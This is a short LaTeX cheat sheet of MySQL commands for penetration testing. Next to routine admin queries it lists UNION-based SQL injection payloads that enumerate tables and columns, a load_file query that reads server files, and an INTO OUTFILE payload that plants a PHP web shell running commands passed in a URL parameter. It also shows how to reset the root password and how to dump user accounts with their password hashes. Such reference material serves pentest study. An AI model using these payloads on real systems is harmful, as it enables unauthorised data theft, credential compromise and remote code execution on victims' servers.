


\section{SQL fro mysql}
\subsection{Usefull commands}

\begin{verbatim}
show databases;
use <database>;
use sys ; -- system schema
show tables;
describe <table_name>;
show columns from <table>;

select version(); #version
select @@version(); #version
select user(); #User
select database(); #database name


#Basic MySQLi
Union Select 1,2,3,4,group_concat(0x7c,table_name,0x7C) from information_schema.tables
Union Select 1,2,3,4,column_name from information_schema.columns where table_name="<TABLE NAME>"

#Read & Write
## Yo need FILE privilege to read & write to files.
select load_file('/var/lib/mysql-files/key.txt'); #Read file
select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE 'C:/xampp/htdocs/back.php'

#Try to change MySQL root password
UPDATE mysql.user SET Password=PASSWORD('MyNewPass') WHERE User='root';
UPDATE mysql.user SET authentication_string=PASSWORD('MyNewPass') WHERE User='root';
FLUSH PRIVILEGES;
quit;
\end{verbatim}



\subsection{usefull functions}
\begin{verbatim}
SELECT group_concat( <field name> ) FROM table
SELECT group( <field name>," ", ...  ) FROM table

CONVERT(unhex("6f6e2e786d6c55540900037748b75c7249b75"), BINARY)
CONVERT(from_base64("aG9sYWFhCg=="), BINARY)
\end{verbatim}

\subsection{privileges}

You can see in the docs the meaning of each privilege:
\url{https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html#priv_execute}

\begin{verbatim}
SELECT USER()
SELECT CURRENT_USER()
# Get users, permissions & hashes
SELECT * FROM mysql.user;

SELECT super_priv FROM mysql.user
SELECT sql_grants FROM information_schema.sql_show_grants
SELECT grantee, privilege_type, 4 FROM information_schema.user_privileges-- -

#Mysql
SHOW GRANTS [FOR user];
SHOW GRANTS;
SHOW GRANTS FOR 'root'@'localhost';
SHOW GRANTS FOR CURRENT_USER();


#From DB
select * from mysql.user where user='root';
## Get users with file_priv
select user,file_priv from mysql.user where file_priv='Y';
## Get users with Super_priv
select user,Super_priv from mysql.user where Super_priv='Y';

# List functions
SELECT routine_name FROM information_schema.routines WHERE routine_type = 'FUNCTION';
#@ Functions not from sys. db
SELECT routine_name FROM information_schema.routines WHERE routine_type = 'FUNCTION' AND routine_schema!='sys';
\end{verbatim}